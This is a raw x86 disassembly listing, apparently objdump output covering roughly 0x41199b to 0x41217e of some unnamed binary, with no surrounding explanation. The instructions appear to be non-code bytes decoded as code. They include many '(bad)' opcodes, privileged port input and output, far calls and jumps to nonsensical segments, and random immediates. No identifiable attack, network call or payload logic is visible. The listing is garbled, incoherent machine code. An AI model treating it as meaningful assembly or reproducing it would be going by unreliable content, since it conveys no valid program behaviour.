  41199b:	imul   ecx,DWORD PTR [edi-0x7],0x9103cce4
  4119a2:	js     0x411a07
  4119a4:	cs sbb ax,0xe93f
  4119a9:	(bad)  
  4119aa:	mov    bl,0x8f
  4119ac:	mov    ds:0x4a2f4cf0,eax
  4119b1:	sub    BYTE PTR [esi+0x4d10ddd5],bh
  4119b7:	fstp   QWORD PTR cs:[esi]
  4119ba:	and    eax,0x6d0f92ab
  4119bf:	fcomp  st(3)
  4119c1:	xchg   ecx,edx
  4119c3:	int    0x47
  4119c5:	cli    
  4119c6:	xchg   esi,eax
  4119c7:	mov    eax,esp
  4119c9:	repz (bad) 
  4119cb:	cmc    
  4119cc:	dec    esp
  4119cd:	out    dx,eax
  4119ce:	fadd   DWORD PTR [ecx]
  4119d0:	fistp  WORD PTR [esi+0x7c687905]
  4119d6:	pop    ebx
  4119d7:	lea    edi,[esp+edx*4+0x68]
  4119db:	std    
  4119dc:	daa    
  4119dd:	dec    ebx
  4119de:	sar    WORD PTR [ecx+0xa0ce91d],1
  4119e5:	xchg   BYTE PTR [esi+0x28],bl
  4119e8:	push   edi
  4119e9:	jg     0x41199e
  4119eb:	mov    edx,0x18553bb
  4119f0:	inc    ebx
  4119f1:	loope  0x411999
  4119f3:	push   ebp
  4119f4:	xor    ebp,DWORD PTR [ecx-0x68]
  4119f7:	popa   
  4119f8:	aaa    
  4119f9:	aad    0x91
  4119fb:	jp     0x4119a9
  4119fd:	xchg   esp,eax
  4119fe:	sbb    ch,BYTE PTR [esi+0x48b5c131]
  411a04:	sbb    ch,dl
  411a06:	dec    esp
  411a07:	xor    al,0x7b
  411a09:	inc    esi
  411a0a:	arpl   WORD PTR [esi-0x13],dx
  411a0d:	call   0xab86:0xef52a633
  411a14:	and    DWORD PTR [esi-0x4a],ecx
  411a17:	jbe    0x411a2d
  411a19:	add    ebx,edx
  411a1b:	stos   BYTE PTR es:[edi],al
  411a1c:	aas    
  411a1d:	cs aad 0x73
  411a20:	xchg   ebx,eax
  411a21:	sub    esi,esp
  411a23:	mov    ch,0x46
  411a25:	retf   0x523e
  411a28:	jo     0x4119f0
  411a2a:	mov    BYTE PTR [edi],dl
  411a2c:	dec    eax
  411a2d:	inc    eax
  411a2e:	jno    0x411a11
  411a30:	repnz inc esp
  411a32:	cli    
  411a33:	or     al,0xca
  411a35:	mov    ch,0xc7
  411a37:	jne    0x411ab8
  411a39:	mov    cl,0x26
  411a3b:	out    0x49,eax
  411a3d:	sbb    ebp,DWORD PTR [edx-0x1261973d]
  411a43:	scas   al,BYTE PTR es:[edi]
  411a44:	mov    BYTE PTR [esi-0x43],dl
  411a47:	xchg   BYTE PTR [edi+ecx*4-0x4],bh
  411a4b:	xchg   ebp,eax
  411a4c:	xchg   ebp,eax
  411a4d:	sti    
  411a4e:	enter  0xbc10,0xea
  411a52:	sub    eax,0xaf115885
  411a57:	jb     0x411a3f
  411a59:	pop    ecx
  411a5a:	dec    edi
  411a5b:	and    BYTE PTR [ecx],0x0
  411a5e:	add    ah,BYTE PTR [di]
  411a61:	xor    edi,eax
  411a63:	retf   
  411a64:	jns    0x411a4e
  411a66:	sbb    al,0x38
  411a68:	push   ss
  411a69:	inc    edx
  411a6a:	ins    BYTE PTR es:[edi],dx
  411a6b:	outs   dx,BYTE PTR ds:[esi]
  411a6c:	or     DWORD PTR [ebx],0xbdc24690
  411a72:	fist   WORD PTR [ebx+0x58a64c32]
  411a78:	das    
  411a79:	or     al,0xc5
  411a7b:	or     eax,0xd509d3c
  411a80:	push   0x8327b495
  411a85:	ret    0x2ebf
  411a88:	jg     0x411a57
  411a8a:	jge    0x411ab3
  411a8c:	add    BYTE PTR [ebx+0x15],0x5c
  411a90:	xchg   DWORD PTR [edi],edi
  411a92:	add    ebx,0x1322ba17
  411a98:	xor    ebp,esp
  411a9a:	mov    ah,BYTE PTR [ebp-0xfb85d9a]
  411aa0:	pop    ecx
  411aa1:	jecxz  0x411b15
  411aa3:	xor    eax,0xa3d99f15
  411aa8:	cli    
  411aa9:	xchg   esi,eax
  411aaa:	mov    ah,dl
  411aac:	adc    ch,BYTE PTR [esi-0x1f]
  411aaf:	cmc    
  411ab0:	in     eax,dx
  411ab1:	sub    ebx,DWORD PTR [esi+0x3d06b317]
  411ab7:	fbstp  TBYTE PTR [edi-0xc023c48]
  411abd:	push   ss
  411abe:	and    al,0x6e
  411ac0:	push   0xe411b3ed
  411ac5:	test   BYTE PTR [edx-0x60],ch
  411ac8:	sbb    al,bl
  411aca:	push   cs
  411acb:	xchg   esp,eax
  411acc:	dec    edx
  411acd:	push   DWORD PTR [ecx-0x72]
  411ad0:	mov    esp,0xa39afaf7
  411ad5:	xor    BYTE PTR [edi],dl
  411ad7:	jl     0x411a90
  411ad9:	fld    QWORD PTR [edi]
  411adb:	jmp    DWORD PTR [ecx-0x4ad808b3]
  411ae1:	mov    bh,0x31
  411ae3:	push   0xffffffe1
  411ae5:	ror    DWORD PTR [ebx+edx*1+0x1],0x6f
  411aea:	aaa    
  411aeb:	push   cs
  411aec:	sti    
  411aed:	push   0x72
  411aef:	and    al,BYTE PTR [edx-0x2f]
  411af2:	sahf   
  411af3:	mov    ds:0x3de1850,eax
  411af8:	loope  0x411a8e
  411afa:	cli    
  411afb:	in     eax,0x32
  411afd:	sahf   
  411afe:	pusha  
  411aff:	idiv   dh
  411b01:	popf   
  411b02:	addr16 sahf 
  411b04:	sahf   
  411b05:	out    0x3e,eax
  411b07:	push   ds
  411b08:	push   0xffffff86
  411b0a:	call   0x743b0bb
  411b0f:	ja     0x411b75
  411b11:	pop    esi
  411b12:	xchg   ecx,eax
  411b13:	jp     0x411acf
  411b15:	and    al,ah
  411b17:	xor    eax,0x4bc5e02f
  411b1c:	adc    eax,0x376e5a77
  411b21:	pop    edi
  411b22:	inc    edi
  411b23:	in     al,dx
  411b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b25:	imul   esi,DWORD PTR [ebp+edx*4-0x43],0x29
  411b2a:	mov    dl,0x29
  411b2c:	fucomip st,st(4)
  411b2e:	std    
  411b2f:	xor    eax,ecx
  411b31:	addr16 out dx,eax
  411b33:	mov    eax,0x97600f92
  411b38:	pusha  
  411b39:	scas   eax,DWORD PTR es:[edi]
  411b3a:	lds    ecx,FWORD PTR [ebx+0x378cac7]
  411b40:	out    dx,eax
  411b41:	mov    bl,BYTE PTR [esi+0x66c68d49]
  411b47:	out    dx,al
  411b48:	ins    DWORD PTR es:[edi],dx
  411b49:	ins    DWORD PTR es:[edi],dx
  411b4a:	xchg   ebx,eax
  411b4b:	xor    al,BYTE PTR [eax+0x2f7c9953]
  411b51:	cmc    
  411b52:	xor    edi,esi
  411b54:	pusha  
  411b55:	push   cs
  411b56:	pop    edi
  411b57:	aad    0x25
  411b59:	adc    al,0x8d
  411b5b:	test   eax,0xc7e2ddea
  411b60:	pop    es
  411b61:	adc    ebx,DWORD PTR [edi-0x75c38bb3]
  411b67:	mov    edi,0x61bf4e4a
  411b6c:	imul   BYTE PTR [edi+0x49552692]
  411b72:	dec    edx
  411b73:	(bad)  
  411b74:	fiadd  WORD PTR [edx]
  411b76:	cwde   
  411b77:	push   ebp
  411b78:	repz mov bh,0x5e
  411b7b:	adc    eax,0xd2b8cb48
  411b80:	sub    eax,0xda470264
  411b85:	jp     0x411b43
  411b87:	out    0x29,eax
  411b89:	mov    dh,0xed
  411b8b:	adc    eax,0x7701ec73
  411b90:	cmovge ebx,DWORD PTR [esi+0x46]
  411b94:	jecxz  0x411c05
  411b96:	jle    0x411b46
  411b98:	imul   esi,DWORD PTR [edx+0x68673ee1],0xfe56135e
  411ba2:	inc    eax
  411ba3:	push   eax
  411ba4:	repz adc bl,BYTE PTR [esi+0x6b]
  411ba8:	daa    
  411ba9:	fidiv  DWORD PTR [edx+0x3f868db1]
  411baf:	fnstcw WORD PTR [eax]
  411bb1:	cmp    DWORD PTR [edx],0xffffff83
  411bb4:	pusha  
  411bb5:	push   0xffffffbb
  411bb7:	sub    esp,DWORD PTR [edi-0x51]
  411bba:	popf   
  411bbb:	fimul  DWORD PTR [eax+0x5da83b1]
  411bc1:	jo     0x411bf8
  411bc3:	sub    edi,DWORD PTR [eax+esi*1+0x2ebad522]
  411bca:	fist   DWORD PTR [ebx+edi*1+0x197677da]
  411bd1:	jle    0x411b6d
  411bd3:	jns    0x411c44
  411bd5:	nop
  411bd6:	pop    esi
  411bd7:	movnti DWORD PTR [ecx],esp
  411bda:	(bad)  
  411bdb:	stc    
  411bdc:	stc    
  411bdd:	xor    eax,0x56be34a6
  411be2:	(bad)  
  411be3:	sub    edx,DWORD PTR [esi]
  411be5:	mov    cl,dh
  411be7:	mov    ebp,0xa01e3997
  411bec:	pop    ecx
  411bed:	clc    
  411bee:	jbe    0x411bee
  411bf0:	sti    
  411bf1:	(bad)  
  411bf3:	jns    0x411bcd
  411bf5:	pop    ds
  411bf6:	push   esi
  411bf7:	sub    cl,BYTE PTR [ecx]
  411bf9:	inc    edi
  411bfa:	jmp    0xad58:0xb56bfdcc
  411c01:	popf   
  411c02:	and    eax,0xf0ce503c
  411c07:	or     ah,BYTE PTR [ebx-0x22fda1ad]
  411c0d:	test   BYTE PTR [ecx+0x33a9b8af],0xb5
  411c14:	leave  
  411c15:	sahf   
  411c16:	jmp    0x411c45
  411c18:	in     al,0x92
  411c1a:	lods   al,BYTE PTR ds:[esi]
  411c1b:	inc    eax
  411c1c:	addr16 dec esi
  411c1e:	cdq    
  411c1f:	es inc esp
  411c21:	xor    al,0x25
  411c23:	sub    BYTE PTR [ecx+0xe],ch
  411c26:	sar    ebx,0x7f
  411c29:	(bad)  
  411c2a:	imul   ecx,eax,0xcb3a45ce
  411c30:	and    ebx,esi
  411c32:	add    DWORD PTR [edx-0x17b8873],ebp
  411c38:	xchg   edi,eax
  411c39:	out    dx,eax
  411c3a:	xor    al,0x55
  411c3c:	das    
  411c3d:	mov    eax,0xa812eb1f
  411c42:	out    dx,al
  411c43:	lock int3 
  411c45:	cmp    ecx,DWORD PTR [ecx-0x77f9b33f]
  411c4b:	jo     0x411c7f
  411c4d:	inc    eax
  411c4e:	cmp    al,0xb5
  411c50:	iret   
  411c51:	fisttp DWORD PTR [eax]
  411c53:	jmp    0x411c79
  411c55:	pop    eax
  411c56:	into   
  411c57:	xor    eax,0xef9346dc
  411c5c:	repz sbb al,0xde
  411c5f:	bound  ebp,QWORD PTR [ebx]
  411c61:	pop    ss
  411c62:	aas    
  411c63:	add    DWORD PTR [ebx],0x3a
  411c66:	test   BYTE PTR [edx+edx*8+0x1ea88d53],ch
  411c6d:	popa   
  411c6e:	lea    ebx,[edi-0x6345faf4]
  411c74:	ja     0x411c80
  411c76:	xchg   edi,eax
  411c77:	push   0xe465cfdc
  411c7c:	push   ds
  411c7d:	ja     0x411cce
  411c7f:	inc    esp
  411c80:	cmp    al,0x44
  411c82:	ret    
  411c83:	sbb    esi,esi
  411c85:	mov    ah,0xdc
  411c87:	mov    eax,ds:0x826da840
  411c8c:	ins    BYTE PTR es:[edi],dx
  411c8d:	and    eax,0x95a2b506
  411c92:	mov    ecx,0x5b86a84f
  411c97:	inc    ebp
  411c98:	dec    edx
  411c99:	and    DWORD PTR [ebx],0xc
  411c9c:	mov    ch,0xd9
  411c9e:	ss cs loopne 0x411d1c
  411ca2:	mov    bl,0x9f
  411ca4:	jne    0x411cc9
  411ca6:	add    BYTE PTR [ebx+0x48],ah
  411ca9:	test   eax,0xdb6bd5ce
  411cae:	adc    BYTE PTR [ecx+ebx*2+0xaf6f876],bl
  411cb5:	lods   al,BYTE PTR ds:[esi]
  411cb6:	(bad)  
  411cb7:	int    0x86
  411cb9:	(bad)  
  411cba:	aaa    
  411cbb:	xlat   BYTE PTR ds:[ebx]
  411cbc:	int3   
  411cbd:	jl     0x411c60
  411cbf:	je     0x411d01
  411cc1:	mov    al,ds:0xb2f13b72
  411cc6:	out    0xd,eax
  411cc8:	or     eax,0x21e24276
  411ccd:	fistp  DWORD PTR [edx+edi*1-0x180addb]
  411cd4:	sub    al,0x20
  411cd6:	aaa    
  411cd7:	push   eax
  411cd8:	pop    ss
  411cd9:	inc    esi
  411cda:	test   DWORD PTR [ebp+ecx*1-0x5e9e8e7c],ebx
  411ce1:	ins    BYTE PTR es:[edi],dx
  411ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce3:	cld    
  411ce4:	stc    
  411ce5:	xor    ch,BYTE PTR [edi-0x2651828]
  411ceb:	test   eax,0xdbe14f78
  411cf0:	mov    eax,0xda838b2e
  411cf5:	mov    al,0x61
  411cf7:	pop    ds
  411cf8:	(bad)  
  411cf9:	icebp  
  411cfa:	cmp    BYTE PTR [esi-0x43c48963],ah
  411d00:	(bad)  
  411d01:	(bad)  
  411d02:	push   edx
  411d03:	xor    eax,0x9f0f1111
  411d08:	xor    DWORD PTR [edi-0x64],esp
  411d0b:	aad    0xb1
  411d0d:	dec    edi
  411d0e:	clc    
  411d0f:	add    eax,0x9357b7c7
  411d14:	inc    ebx
  411d15:	repnz int 0x30
  411d18:	ins    BYTE PTR es:[edi],dx
  411d19:	adc    DWORD PTR [esp+edi*1+0x61222c28],edi
  411d20:	out    0x67,al
  411d22:	dec    ebx
  411d23:	iret   
  411d24:	or     al,0x40
  411d27:	stos   DWORD PTR es:[edi],eax
  411d28:	fisubr WORD PTR [eax-0x688ad22c]
  411d2e:	(bad)  
  411d2f:	or     dl,bh
  411d31:	ins    BYTE PTR es:[edi],dx
  411d32:	mov    DWORD PTR ds:[eax+0x7],edx
  411d36:	mov    bl,0xcc
  411d38:	ins    DWORD PTR es:[edi],dx
  411d39:	imul   edi,edx,0xc8336151
  411d3f:	fcom   DWORD PTR [esi+0x6cec755a]
  411d45:	push   edx
  411d46:	loop   0x411ce7
  411d48:	pop    edi
  411d49:	ins    DWORD PTR es:[edi],dx
  411d4a:	int    0xc7
  411d4c:	inc    ebp
  411d4d:	cmc    
  411d4e:	hlt    
  411d4f:	mov    al,BYTE PTR [ebx-0x25a6c98c]
  411d55:	jbe    0x411da1
  411d57:	push   0x82ea8608
  411d5c:	lods   al,BYTE PTR ds:[esi]
  411d5d:	scas   al,BYTE PTR es:[edi]
  411d5e:	call   0x2067:0xe22cfb33
  411d65:	dec    BYTE PTR [ecx]
  411d67:	fwait
  411d68:	push   ds
  411d69:	cmp    BYTE PTR [ecx],0x81
  411d6c:	push   eax
  411d6d:	mov    esp,ecx
  411d6f:	dec    edx
  411d70:	fidivr DWORD PTR [edi+0x6e20b30f]
  411d76:	push   ds
  411d77:	mov    esi,0xda02f89b
  411d7c:	pop    ds
  411d7d:	or     esp,edx
  411d7f:	adc    eax,0x5978f678
  411d84:	es push 0x8d39b4b5
  411d8a:	and    BYTE PTR [ebp-0x4b7f32d7],cl
  411d90:	ja     0x411e11
  411d92:	repz mov ebx,0xf9f4ce9d
  411d98:	cld    
  411d99:	pop    es
  411d9a:	ret    
  411d9b:	cmc    
  411d9c:	rcr    ebp,cl
  411d9e:	mov    DWORD PTR [edx+0x2e],esi
  411da1:	retf   
  411da2:	fcom   QWORD PTR [edx]
  411da4:	mul    DWORD PTR [ebp+edi*1+0x1b]
  411da8:	mov    gs,ebx
  411daa:	inc    edx
  411dab:	and    DWORD PTR [edx],0x1
  411dae:	inc    BYTE PTR [esi]
  411db0:	xor    BYTE PTR [ecx],dh
  411db2:	call   0xb022:0x91925cf9
  411db9:	sbb    esp,DWORD PTR [esp+ebp*1+0x3c]
  411dbd:	test   al,0x17
  411dbf:	aaa    
  411dc0:	xchg   esp,eax
  411dc1:	mov    eax,ds:0xb4b9cc56
  411dc6:	loopne 0x411e1f
  411dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dc9:	sub    eax,DWORD PTR [ebp+0x5b]
  411dcc:	jns    0x411dc0
  411dce:	bound  eax,QWORD PTR ds:0xfc8109ba
  411dd4:	xchg   ecx,eax
  411dd5:	or     ebp,DWORD PTR [esi]
  411dd7:	out    0x62,al
  411dd9:	repz in eax,dx
  411ddb:	dec    edx
  411ddc:	iret   
  411ddd:	fwait
  411dde:	cmp    BYTE PTR [ebx+0x2b],bl
  411de1:	jo     0x411d88
  411de3:	dec    ebp
  411de4:	pop    esp
  411de5:	add    DWORD PTR [eax],esp
  411de7:	sbb    eax,0x672ee7d4
  411dec:	sti    
  411ded:	ins    DWORD PTR es:[edi],dx
  411dee:	cld    
  411def:	jge    0x411e5e
  411df1:	in     al,dx
  411df2:	aam    0xe
  411df4:	and    DWORD PTR [edx+0x7e],ebp
  411df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411df8:	jb     0x411db6
  411dfa:	push   es
  411dfb:	xchg   ebp,eax
  411dfc:	das    
  411dfd:	or     eax,0x63bf9ff5
  411e02:	jnp    0x411db1
  411e04:	cdq    
  411e05:	dec    edx
  411e06:	inc    ebp
  411e07:	fwait
  411e08:	enter  0x4f19,0x4b
  411e0c:	sbb    al,0x6e
  411e0e:	repz pop ds
  411e10:	inc    dx
  411e12:	sbb    BYTE PTR [ebx],ch
  411e14:	xor    al,0x74
  411e16:	int    0x52
  411e18:	push   0xffffff93
  411e1a:	mov    esi,0xe2bb8c05
  411e1f:	push   edi
  411e20:	sub    al,BYTE PTR [edx]
  411e22:	fadd   QWORD PTR [ebp+edx*8-0x7f80944d]
  411e29:	shl    BYTE PTR [ecx+0xf],cl
  411e2c:	mov    ds:0xc198f0d2,al
  411e31:	js     0x411dd6
  411e33:	les    esp,FWORD PTR [eax+ecx*1]
  411e36:	loop   0x411dfc
  411e38:	retf   0xbf80
  411e3b:	push   ebx
  411e3c:	bound  esi,QWORD PTR [ebx]
  411e3e:	inc    esi
  411e3f:	push   ecx
  411e40:	cs or  eax,0xaf776c96
  411e46:	sub    ah,BYTE PTR [edx-0x57]
  411e49:	mov    ebp,0x79cb105d
  411e4e:	mov    dh,0xae
  411e50:	xlat   BYTE PTR ds:[ebx]
  411e51:	pop    ds
  411e52:	out    0xf9,al
  411e54:	inc    DWORD PTR [ebp+0x64ce1f7]
  411e5a:	out    0x2a,eax
  411e5c:	arpl   WORD PTR ds:0x1c0a6942,dx
  411e62:	cdq    
  411e63:	shl    DWORD PTR [edi-0x45],0x43
  411e67:	mov    eax,ds:0x5455077f
  411e6c:	js     0x411ecd
  411e6e:	inc    eax
  411e6f:	es push eax
  411e71:	add    edi,DWORD PTR [ebp-0x65a848e3]
  411e77:	in     al,dx
  411e78:	xchg   edi,eax
  411e79:	inc    ebp
  411e7a:	push   esp
  411e7b:	test   eax,0xcb7a1430
  411e80:	jae    0x411e10
  411e82:	mov    esi,0x98f77d8c
  411e87:	push   es
  411e88:	xlat   BYTE PTR ds:[ebx]
  411e89:	push   0x2dbfa79a
  411e8e:	sti    
  411e8f:	fsub   DWORD PTR [esi+edi*4-0x46]
  411e93:	ja     0x411e74
  411e95:	mov    ebx,0xbe7bc2fe
  411e9a:	mov    bl,0x77
  411e9c:	mov    dl,BYTE PTR [ebx-0x6ae45dbc]
  411ea2:	(bad)
  411ea6:	cmc    
  411ea7:	add    dh,dh
  411ea9:	adc    edx,DWORD PTR [edi+0x304d8812]
  411eaf:	sbb    edi,DWORD PTR [edi]
  411eb1:	cld    
  411eb2:	loope  0x411e8c
  411eb4:	sub    DWORD PTR [ecx+0xd06869f],eax
  411eba:	das    
  411ebb:	add    edi,ecx
  411ebd:	or     eax,0xc9c619e6
  411ec2:	xor    BYTE PTR [edi],cl
  411ec4:	push   esp
  411ec5:	dec    ebx
  411ec6:	adc    eax,0x6d0d112b
  411ecb:	xor    esi,DWORD PTR [ebx-0x3e1dd0e7]
  411ed1:	inc    ecx
  411ed2:	(bad)  
  411ed3:	in     al,dx
  411ed4:	idiv   BYTE PTR [ebp+0x2e710ac7]
  411eda:	dec    edx
  411edb:	std    
  411edc:	retf   0xab7b
  411edf:	push   eax
  411ee0:	ins    BYTE PTR es:[edi],dx
  411ee1:	sbb    eax,0x3a4a7483
  411ee6:	iret   
  411ee7:	int3   
  411ee8:	sub    al,0x2e
  411eea:	test   al,0x95
  411eec:	aad    0xbe
  411eee:	xor    eax,DWORD PTR [esi+0x467cb531]
  411ef4:	out    0x6d,eax
  411ef6:	out    dx,al
  411ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ef8:	scas   eax,DWORD PTR es:[edi]
  411ef9:	pop    ebx
  411efa:	fldcw  WORD PTR [ebp+0x1a66074d]
  411f00:	dec    esi
  411f01:	loope  0x411f7c
  411f03:	mov    WORD PTR [edi-0x6d58e835],fs
  411f09:	sbb    DWORD PTR [ebx],0xffffff87
  411f0c:	adc    dh,dh
  411f0e:	xchg   edi,eax
  411f0f:	xchg   DWORD PTR [edx],edx
  411f11:	or     esi,esp
  411f13:	push   ebx
  411f14:	dec    ecx
  411f15:	(bad)  
  411f16:	loopne 0x411ec3
  411f18:	leave  
  411f19:	inc    esi
  411f1a:	jl     0x411edd
  411f1c:	mov    ds:0xd289084b,al
  411f21:	or     bl,BYTE PTR [ebx-0x2e197a23]
  411f27:	popf   
  411f28:	pop    esp
  411f29:	pop    ss
  411f2a:	cld    
  411f2b:	jp     0x411ec1
  411f2d:	mov    ds:0xde392b42,al
  411f32:	push   ss
  411f33:	lods   eax,DWORD PTR ds:[esi]
  411f34:	aad    0x59
  411f36:	int3   
  411f37:	jmp    0x5bff75a8
  411f3c:	jge    0x411f11
  411f3e:	jmp    0xdb2bb2ba
  411f43:	mov    al,0x9b
  411f45:	pop    ebp
  411f46:	inc    ebx
  411f47:	or     BYTE PTR [eax+0x67],cl
  411f4a:	mov    ch,0xf4
  411f4c:	ins    DWORD PTR es:[edi],dx
  411f4d:	bnd call 0x1719ce3f
  411f53:	imul   esi,DWORD PTR [ebx-0x6df284dc],0xdc5792dd
  411f5d:	dec    esp
  411f5e:	jmp    0x411faf
  411f60:	inc    esi
  411f61:	scas   al,BYTE PTR es:[edi]
  411f62:	push   es
  411f63:	icebp  
  411f64:	hlt    
  411f65:	jne    0x411f02
  411f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f68:	xor    eax,0x414c3787
  411f6d:	stos   DWORD PTR es:[edi],eax
  411f6e:	bound  esi,QWORD PTR [edx]
  411f70:	je     0x411f7e
  411f72:	add    al,0x8c
  411f74:	mov    ds:0x82bd42e9,eax
  411f79:	push   ebp
  411f7a:	xchg   esi,eax
  411f7b:	das    
  411f7c:	mov    esp,0xc0755e7b
  411f81:	call   DWORD PTR [ecx+0x7]
  411f84:	or     edi,DWORD PTR ss:[edx-0x67]
  411f88:	xor    bl,BYTE PTR [edi]
  411f8a:	call   0xc796c0e6
  411f8f:	and    dh,BYTE PTR ds:0x23f0392c
  411f95:	daa    
  411f96:	and    bh,BYTE PTR [esi+0x3]
  411f99:	aam    0x50
  411f9b:	and    ah,BYTE PTR [esi-0x2f]
  411f9e:	out    dx,eax
  411f9f:	xlat   BYTE PTR ds:[ebx]
  411fa0:	xor    ah,0x6e
  411fa3:	not    al
  411fa5:	(bad)
  411fa8:	add    eax,0xf1ac4ed7
  411fad:	mov    dl,0xcc
  411faf:	sub    al,0xd3
  411fb1:	jns    0x411f45
  411fb3:	and    eax,0xf2521470
  411fb8:	icebp  
  411fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fba:	xchg   ecx,eax
  411fbb:	es out dx,al
  411fbd:	jp     0x411fc0
  411fbf:	mov    ebx,0x7f38e143
  411fc4:	adc    ch,BYTE PTR [ecx+ecx*4]
  411fc7:	inc    ebp
  411fc8:	lods   eax,DWORD PTR ds:[esi]
  411fc9:	loope  0x411ff0
  411fcb:	push   esi
  411fcc:	ret    
  411fcd:	out    0xb3,al
  411fcf:	ja     0x412007
  411fd1:	test   BYTE PTR [ebx+0x4887c52d],ch
  411fd7:	mov    dl,0xab
  411fd9:	cmp    esi,esp
  411fdb:	ja     0x411f93
  411fdd:	ins    BYTE PTR es:[edi],dx
  411fde:	or     DWORD PTR [edi-0x1b9ec403],0x63984cde
  411fe8:	lods   eax,DWORD PTR ds:[esi]
  411fe9:	mov    cl,0x4
  411feb:	adc    bh,BYTE PTR es:[edx+0x2d993284]
  411ff2:	mov    ecx,0x7b039aeb
  411ff7:	jmp    0x411fb8
  411ff9:	mov    ebp,0xf4c01dc7
  411ffe:	nop
  411fff:	push   ds
  412000:	pop    ss
  412001:	xor    esi,edi
  412003:	mov    BYTE PTR [esi+0x161285c8],al
  412009:	out    dx,eax
  41200a:	dec    esi
  41200b:	jp     0x41202a
  41200d:	mov    ebx,0xbe4d7425
  412012:	jbe    0x412025
  412014:	(bad)
  412017:	out    dx,eax
  412018:	pop    edx
  412019:	push   ebp
  41201a:	ffreep st(0)
  41201c:	lahf   
  41201d:	mov    dl,0xc4
  41201f:	sbb    ch,BYTE PTR [edi+0x65]
  412022:	sbb    bh,al
  412024:	and    eax,edx
  412026:	ficomp WORD PTR [edi-0x71ab88a4]
  41202c:	add    BYTE PTR [edi+0x198de268],cl
  412032:	aam    0x81
  412034:	js     0x41208b
  412036:	jl     0x411fdf
  412038:	in     eax,0x8c
  41203a:	xor    BYTE PTR [eax+0x7f9f3843],al
  412040:	aad    0x50
  412042:	add    ebx,DWORD PTR [esi-0x6b5566e8]
  412048:	dec    eax
  412049:	push   0xffffff82
  41204b:	test   DWORD PTR ds:0x77b1e229,esi
  412051:	imul   edi,DWORD PTR [eax],0x891b1cf4
  412057:	inc    ebp
  412058:	adc    al,0xc9
  41205a:	stos   BYTE PTR es:[edi],al
  41205b:	cld    
  41205c:	or     al,0x37
  41205e:	add    ecx,DWORD PTR [esi+0x13]
  412061:	pushf  
  412062:	cmp    al,ch
  412064:	data16 mov WORD PTR [edx-0x8064f04],es
  41206b:	xor    eax,0x8fe975df
  412070:	fcmovne st,st(6)
  412072:	add    DWORD PTR [esi-0x57f9f8a4],esi
  412078:	add    DWORD PTR [bx+di+0x3f7f],eax
  41207d:	jmp    0x41203e
  41207f:	test   bh,0xed
  412082:	sbb    eax,0xdbb35ab3
  412087:	clc    
  412088:	inc    ecx
  412089:	sbb    BYTE PTR ds:0x2bd6e346,bh
  41208f:	rcr    BYTE PTR [ecx],cl
  412091:	push   ebp
  412092:	out    dx,eax
  412093:	not    BYTE PTR [edi]
  412095:	mov    eax,0x1b99ba0
  41209a:	scas   al,BYTE PTR es:[edi]
  41209b:	hlt    
  41209c:	sub    al,0xea
  41209e:	mov    ds:0xdcd71710,eax
  4120a3:	push   esp
  4120a4:	adc    eax,0x2f86167d
  4120a9:	push   0xcd463787
  4120ae:	scas   al,BYTE PTR es:[edi]
  4120af:	inc    edi
  4120b0:	mov    ds:0xb9d23f29,eax
  4120b5:	cmp    esi,DWORD PTR [edi+0x16]
  4120b8:	adc    BYTE PTR [edx+ebp*4],ch
  4120bb:	mov    ch,0x60
  4120bd:	sbb    DWORD PTR [edx],eax
  4120bf:	retf   0x4bbb
  4120c2:	xor    ebp,esp
  4120c4:	retf   0x54bd
  4120c7:	pxor   mm2,QWORD PTR [eax]
  4120ca:	mov    ds:0x29a8ddf0,eax
  4120cf:	pop    es
  4120d0:	lods   eax,DWORD PTR ds:[esi]
  4120d1:	cmp    DWORD PTR [edx+0x36],edi
  4120d4:	cld    
  4120d5:	ss pop ecx
  4120d7:	dec    edi
  4120d8:	scas   al,BYTE PTR es:[edi]
  4120d9:	repz jne 0x4120e2
  4120dc:	or     ah,ah
  4120de:	mov    ebx,0x7a64af88
  4120e3:	push   ecx
  4120e4:	jmp    0xcca6:0x6c333bdc
  4120eb:	lods   eax,DWORD PTR ds:[esi]
  4120ec:	add    al,0x64
  4120ee:	pop    ss
  4120ef:	jnp    0x412168
  4120f1:	pop    esp
  4120f2:	add    eax,0x5b9fc224
  4120f7:	inc    eax
  4120f8:	hlt    
  4120f9:	push   eax
  4120fa:	(bad)  
  4120fb:	mov    eax,esi
  4120fd:	mov    al,0x98
  4120ff:	xchg   BYTE PTR [ecx-0x3d],dh
  412102:	adc    al,0x32
  412104:	imul   ecx,esp,0x58
  412107:	fidiv  WORD PTR [ebx]
  412109:	pushf  
  41210a:	test   esi,esi
  41210c:	cli    
  41210d:	dec    edi
  41210e:	in     eax,dx
  41210f:	jp     0x4120f3
  412111:	cmp    ch,ah
  412113:	jmp    0x41217e
  412115:	loop   0x4120aa
  412117:	fwait
  412118:	es push 0xcf3994a9
  41211e:	pop    edx
  41211f:	xor    BYTE PTR [ebx+0x63fe06a1],ah
  412125:	dec    ebp
  412126:	push   esp
  412127:	outs   dx,BYTE PTR es:[esi]
  412129:	mov    eax,0xbcb1141e
  41212e:	retf   
  41212f:	out    dx,al
  412130:	je     0x4120db
  412132:	inc    esp
  412133:	or     edi,DWORD PTR [ebx]
  412135:	sbb    DWORD PTR [edi],esi
  412137:	push   ebp
  412138:	sar    BYTE PTR [esi-0x59],1
  41213b:	sub    bh,dh
  41213d:	sbb    BYTE PTR [edx+0x7f65e558],ah
  412143:	not    dh
  412145:	or     BYTE PTR [ecx-0x18beb757],al
  41214b:	and    BYTE PTR [edi-0x4c3c1fa2],dl
  412151:	mov    ds:0xfc181235,eax
  412156:	adc    eax,DWORD PTR [ebx+0x7c3db680]
  41215c:	dec    ecx
  41215d:	ss stos BYTE PTR es:[edi],al
  41215f:	into   
  412160:	js     0x4121e0
  412162:	jle    0x41212a
  412164:	push   ds
  412165:	inc    ecx
  412166:	add    DWORD PTR [esi-0x3bf5a900],ecx
  41216c:	adc    BYTE PTR [ebx],0x48
  41216f:	mov    bh,0x58
  412171:	adc    BYTE PTR [esi-0x5063a8ef],dl
  412177:	loopne 0x412141
  412179:	xor    eax,0x118fca7a
  41217e:	ss stos BYTE PTR es:[edi],al
